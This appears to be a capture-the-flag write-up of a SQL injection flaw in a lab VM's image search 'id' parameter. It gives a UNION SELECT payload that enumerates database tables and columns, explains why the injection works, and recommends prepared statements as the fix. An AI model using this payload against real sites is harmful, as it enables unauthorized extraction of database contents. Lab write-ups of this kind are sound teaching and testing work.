# SQL Injection — Image Search

## Vulnerability

The image search `id` parameter is concatenated directly into a SQL query — OWASP A03:2021 Injection.

## Steps to Reproduce

1. Navigate to `http://<VM_IP>/index.php?page=searchimg&id=1`.
2. Inject a UNION SELECT payload:
   ```
   http://<VM_IP>/index.php?page=searchimg&id=1 UNION SELECT CONCAT_WS(0x3A, table_name, column_name), NULL FROM information_schema.columns --
   ```
3. Run `enumerate.py` to automate extraction:
   ```bash
   python enumerate.py
   ```
4. The script discovers the `db_images` table, then extracts title/url columns to find the flag.

## Why It Works

User input from the `id` parameter is interpolated into a SQL query string without sanitization or parameterization. A UNION-based injection appends a second SELECT to exfiltrate arbitrary table data.

## Fix / Mitigation

- Use parameterized queries / prepared statements:
  ```php
  $stmt = $pdo->prepare("SELECT * FROM images WHERE id = ?");
  $stmt->execute([$_GET['id']]);
  ```
- Validate that `id` is a positive integer before use.
